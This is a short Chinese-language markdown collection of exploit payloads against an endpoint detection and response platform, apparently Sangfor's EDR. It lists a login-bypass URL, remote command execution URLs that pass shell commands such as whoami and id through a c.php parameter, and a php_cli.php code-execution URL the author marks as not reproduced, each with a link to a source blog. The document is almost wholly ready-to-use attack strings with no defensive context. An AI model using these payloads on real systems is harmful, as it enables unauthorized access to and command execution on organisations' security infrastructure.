# EDR终端检测响应平台漏洞合集
` @Time : 2020年8月21日, 0021 15:17`
` @Author  : 862897316@qq.com`
` @Software: PyCharm`

```
开始编写
```
###  免密码登陆 Payload
```angular2html
使用浏览器访问
https://ip:prot/ui/login.php?user=任意字符
```
[原文链接](https://blog.csdn.net/qq_32393893/article/details/108116171)

### 远程命令执行
```angular2html
使用浏览器访问
https://ip:prot/tool/log/c.php?strip_slashes=system&host=whoami

https://ip:prot/tool/log/c.php?strip_slashes=system&host=id&path=id&row=id&limit=id
```
[原文链接](https://blog.csdn.net/Alexhcf/article/details/108081912)

### 远程代码执行
```angular2html
https://ip:prot/tool/php_cli.php?code=phpinfo();
未复现成功
```
[原文链接](https://blog.riskivy.com/%e6%b7%b1%e4%bf%a1%e6%9c%8d%e7%bb%88%e7%ab%af%e6%a3%80%e6%b5%8b%e5%b9%b3%e5%8f%b0%ef%bc%88edr%ef%bc%89%e5%ad%98%e5%9c%a8%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/)




> 乾坤未定,你我皆是黑马